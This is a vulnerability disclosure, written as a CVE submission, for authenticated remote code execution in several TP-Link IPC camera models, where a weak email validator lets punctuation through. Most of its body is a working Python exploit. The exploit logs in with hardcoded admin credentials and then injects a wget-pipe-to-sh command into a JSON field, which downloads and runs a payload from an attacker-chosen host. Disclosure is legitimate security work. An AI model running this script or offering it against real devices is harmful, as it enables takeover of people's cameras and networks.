@@ -1,0 +1,98 @@
+[Suggested description]
+TP-LINK IPC TL-IPC223(P)-6, TL-IPC323K-D, TL-IPC325(KP)-*, and
+TL-IPC40A-4 devices allow authenticated remote code execution via
+crafted JSON data because /usr/lib/lua/luci/torchlight/validator.lua
+does not block various punctuation characters.
+
+------------------------------------------
+
+[VulnerabilityType Other]
+RCE
+
+------------------------------------------
+
+[Vendor of Product]
+tp-link
+
+------------------------------------------
+
+[Affected Product Code Base]
+TP-link IPC Camera - TL-IPC325(KP)-*
+TP-link IPC Camera - TL-IPC323K-D *
+TP-link IPC Camera - TL-IPC40A-4 *
+TP-link IPC Camera - TL-IPC223(P)-6 *
+
+------------------------------------------
+
+[Affected Component]
+/usr/lib/lua/luci/torchlight/validator.lua:
+....
+  local e = "^[%a%d%p]+@[%w%d%-]+%."
+  if not n:match(e)then
+....
+
+%p is not strict enough, allows ',",},{, to RCE
+
+------------------------------------------
+
+[Attack Type]
+Remote
+
+------------------------------------------
+
+[Impact Code execution]
+true
+
+------------------------------------------
+
+[Attack Vectors]
+#!/usr/bin/env python
+# encoding: utf-8
+
+import sys
+import json
+import requests
+
+if len(sys.argv) != 3:
+    print "python z.py [TargetIp] [ReverseIP]"
+    exit(1)
+ip = sys.argv[1]
+reverse_ip = sys.argv[2]
+headers = {"Content-Type":"application/json; charset=UTF-8"}
+r = requests.post("http://%s/"%ip, '{"method":"do","login":{"username":"admin","password":"WaQ7x6b09TefbwK", "WHQVQbhc9TefbwK":""}}', headers = headers)
+ret = json.loads(r.text)
+stok = ret['stok']
+url = "http://%s/stok=%s/ds"%(ip, stok)
+data = """{"cloud_config":{"bind":{"username":"testtest@qq.com","password":"'};wget$IFS-qO-$IFS'http://%s/z'|sh;{'"}},"method":"do"}""" %reverse_ip
+
+r = requests.post(url, data, headers = headers).text
+if "0" in r:
+    print "Success."
+elif "-51219" in r:
+    print "You need reboot target device."
+elif "-40401" in r:
+    print "Bypass Auth Failed"
+else:
+    print "Emmm."
+
+------------------------------------------
+
+[Reference]
+http://security.tp-link.com.cn/
+http://service.tp-link.com.cn/detail_download_5471.html(official firmware)
+https://www.tp-link.com/us/security
+
+------------------------------------------
+
+[Discoverer]
+dbappsecurity
+
+[Timeline]
+2018-02-01 Find Vuln.
+2018-02-02 Try to contact TP-Link China ...
+2018-05-24 Failed To contact TP-Link China.
+2018-05-25 Submit to CVE mitre.
+2018-05-26 Got CVE-2018-11481.
+2018-05-28 Make public.
+
+
